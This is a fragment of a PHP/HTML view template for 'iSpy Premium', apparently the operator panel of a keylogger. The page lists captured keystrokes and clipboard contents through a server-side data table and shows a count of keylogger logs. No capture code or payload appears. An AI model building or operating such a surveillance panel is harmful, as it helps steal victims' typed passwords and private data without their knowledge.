...
<head>        
        <!-- META SECTION -->
        <title>iSpy Premium - KeyStrokes|Clipboards</title>            
        ...
        $(document).ready(function() {
            $('#tblKeystrokes').DataTable( {
                  "processing": true,
                  "serverSide": true,
                  "ajax": "<?php echo base_url();?>getstrokes"
             });
        });
        </script>    
        ...
        <div class="page-container">
            ...
            <div class="page-content">
                ...
                <ul class="breadcrumb">
                    ...
                    <li class="active">KeyStrokes|Clipboards</li>
                </ul>
                <!-- END BREADCRUMB -->                
                
                <div class="page-title">                    
                    <h2><span class="fa fa-keyboard-o"></span> KeyStrokes|Clipboards</h2>
                </div>                   
                    ...
                    <div class="row">
                        <div class="col-md-4">
                                <div class="list-group border-bottom">
                                    <a href="logs" class="list-group-item active">KeyStrokes|Clipboards <span class="badge badge-primary"><?php echo $this->security->xss_clean($keylogger_log_amount); ?></span></a>
